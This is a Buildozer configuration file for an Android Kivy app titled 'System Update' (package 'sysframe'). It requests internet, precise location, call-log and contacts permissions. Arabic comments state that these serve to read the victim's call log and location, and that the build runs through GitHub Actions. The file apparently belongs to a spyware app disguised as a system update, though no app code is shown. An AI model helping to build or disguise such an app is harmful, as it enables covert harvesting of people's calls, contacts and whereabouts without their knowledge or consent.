[app]
# (str) Title of your application
title = System Update

# (str) Package name
package.name = sysframe

# (str) Package domain (needed for android packaging)
package.domain = org.test

# (str) Source code where the main.py live
source.dir = .

# (list) Source files to include (let empty to include all the files)
source.include_exts = py,png,jpg,kv,atlas

# (str) Application version
version = 0.1

# (list) Application requirements
# تمت إضافة jnius و plyer للوصول لصلاحيات الهاتف
requirements = python3,kivy,requests,plyer,jnius,urllib3,certifi

# (str) Supported orientation
orientation = portrait

# (bool) Indicate if the application should be fullscreen or not
fullscreen = 1

# (list) Permissions
# الصلاحيات اللازمة لقراءة سجل المكالمات والموقع
android.permissions = INTERNET, ACCESS_FINE_LOCATION, READ_CALL_LOG, READ_CONTACTS

# (int) Target Android API, should be as high as possible.
# تم ضبطه على 31 بناءً على ما اكتشفه النظام في صورتك
android.api = 31

# (int) Minimum API your APK will support.
android.minapi = 21

# (int) Android SDK version to use
android.sdk = 31

# (str) Android NDK version to use
android.ndk = 25b

# (bool) Use --private data storage (True) or --dir public storage (False)
android.private_storage = True

# (list) Android architectures to build for
android.archs = arm64-v8a, armeabi-v7a

# (bool) Skip byte compile for .py files
android.skip_byte_compile = False

# (str) Log level (2 = verbose)
# تم تفعيله لرؤية أي أخطاء بالتفصيل في GitHub Actions
log_level = 2

[buildozer]
# (int) Log level (0 = error only, 1 = info, 2 = debug)
log_level = 2

# (int) Display warning if buildozer is run as root (0 = no, 1 = yes)
warn_on_root = 1